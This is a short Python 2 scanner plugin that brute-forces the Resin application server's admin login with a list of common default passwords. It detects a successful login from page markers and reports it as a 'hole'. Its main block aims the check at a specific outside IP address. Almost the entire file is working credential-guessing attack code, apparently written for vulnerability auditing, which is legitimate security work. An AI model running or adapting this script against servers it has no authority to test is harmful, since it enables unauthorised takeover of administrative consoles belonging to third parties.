#coding:utf-8
import urllib2


from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        res=None
        error_i = 0
        flag_list=['<th>Resin home:</th>','The Resin version','Resin Summary']
        user_list=['admin']
        pass_list=['admin','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        for user in user_list:
            for password in pass_list:
                try:
                    PostStr='j_username=%s&j_password=%s'%(user,password)
                    res = opener.open(target_url+'/resin-admin/j_security_check?j_uri=index.php',PostStr)
                    res_html = res.read()
                    res_code = res.code
                except urllib2.HTTPError,e:
                    return result
                except urllib2.URLError,e:
                    error_i+=1
                    if error_i >= 3:
                        return result
                    continue
                except:

                    return result   
                finally:
                    if res is not None:
                        res.close()
                        del res
                for flag in flag_list:
                    if flag in res_html or int(res_code) == 408:
                        info = '%s/resin-admin Resin Weak password %s:%s'%(target_url,user,password)
                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='Resin Weak password'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=target_url+'/resin-admin'
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'
                        return result
        return result




   
            

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')      